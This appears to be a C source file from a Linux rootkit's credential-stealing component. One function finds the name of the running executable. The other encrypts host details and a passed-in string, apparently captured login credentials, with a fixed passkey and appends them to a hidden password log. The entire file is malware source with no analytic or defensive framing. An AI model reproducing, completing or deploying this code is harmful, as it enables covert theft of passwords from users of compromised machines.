#include <stdio.h>
#include <libgen.h>
#include <string.h>
#include <strings.h>
#include <time.h>
#include <errno.h>
#include <stdlib.h>
#include "rkcrypt.h"
#include "rkcommon.h"
#include "util.h"

void getexe(char *exe)
{
	char buf[4096]={0x0};
	char *p = NULL;
	int i = readlink("/proc/self/exe", buf, 4095);
	if(i > 0 && buf[0] == '/'){
		buf[i] = '\0';
		
		p = rindex(buf, '/');
		p++;

		snprintf(exe, 256, "%s", p);
	}
	else
		*exe = 0x0;
}

int mailto(char *up)
{
	getinfo();

	char exe[256] = {0x0};
	getexe(exe);

	char *decrypt = rk_encrypt(passkey, hostinfo);
	if (decrypt == 0)
	{
		fprintf(stderr, "rk_encrypt error %m\n");
		return -1;
	}
	FILE *fp = fopen(passwordlog, "a+");
	if (fp)
	{
		fprintf(fp, "%s:%s|", exe, decrypt);
		fclose(fp);
	}
	free(decrypt);

	decrypt = rk_encrypt(passkey, up);
	if (decrypt == 0)
	{
		fprintf(stderr, "rk_encrypt error %m\n");
		return -1;
	}
	fp = fopen(passwordlog, "a+");
	if (fp)
	{
		fprintf(fp, "%s\n", decrypt);
		fclose(fp);
	}
	free(decrypt);
	return 0;
}
